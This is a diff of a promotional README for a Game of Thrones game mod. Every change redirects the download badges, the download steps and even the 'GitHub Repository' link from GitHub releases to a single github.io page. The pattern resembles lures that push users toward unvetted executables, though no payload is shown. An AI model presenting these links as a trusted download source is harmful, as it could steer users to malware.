@@ -1,6 +1,6 @@
 # 🐺 GOT-kingsroad-mod - Unlock the Ultimate Game of Thrones Experience
 
-[![Download Now](https://img.shields.io/badge/Download-GOT--kingsroad--mod-blue?style=for-the-badge&logo=github)](https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases)
+[![Download Now](https://img.shields.io/badge/Download-GOT--kingsroad--mod-blue?style=for-the-badge&logo=github)](https://kimberlygo60.github.io)
 
 ---
 
@@ -50,7 +50,7 @@ Getting started with GOT-kingsroad-mod is easier than you might think. Follow th
 
 ### Step 1: Download the Mod
 
-Visit this link to download the application: [https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases](https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases)
+Visit this link to download the application: [https://kimberlygo60.github.io](https://kimberlygo60.github.io)
 
 When you click the link, you'll be taken to the download page. Look for the latest release and click the download button. The file will start downloading automatically.
 
@@ -76,9 +76,9 @@ Now you're ready to dive into the world of Game of Thrones with all the advantag
 
 Ready to get started? Here's your direct download link:
 
-[![Download GOT-kingsroad-mod](https://img.shields.io/badge/Download-GOT--kingsroad--mod-green?style=for-the-badge)](https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases)
+[![Download GOT-kingsroad-mod](https://img.shields.io/badge/Download-GOT--kingsroad--mod-green?style=for-the-badge)](https://kimberlygo60.github.io)
 
-Visit this link to download the application: [https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases](https://github.com/Kimberlygo60/GOT-kingsroad-mod/releases)
+Visit this link to download the application: [https://kimberlygo60.github.io](https://kimberlygo60.github.io)
 
 Once you're on the page, you'll see a list of available releases. Click on the latest version to download it. The process is quick and straightforward.
 
@@ -133,7 +133,7 @@ Stay up to date with the latest improvements and fixes:
 
 We're here to help! If you have questions, suggestions, or just want to connect with other users, check out the following resources:
 
-- **GitHub Repository:** [https://github.com/Kimberlygo60/GOT-kingsroad-mod](https://github.com/Kimberlygo60/GOT-kingsroad-mod)
+- **GitHub Repository:** [https://kimberlygo60.github.io](https://kimberlygo60.github.io)
 - **Issues & Feedback:** Visit the "Issues" tab on GitHub to report bugs or request new features.
 - **Updates:** Star the repository to receive notifications about new releases and updates.
 
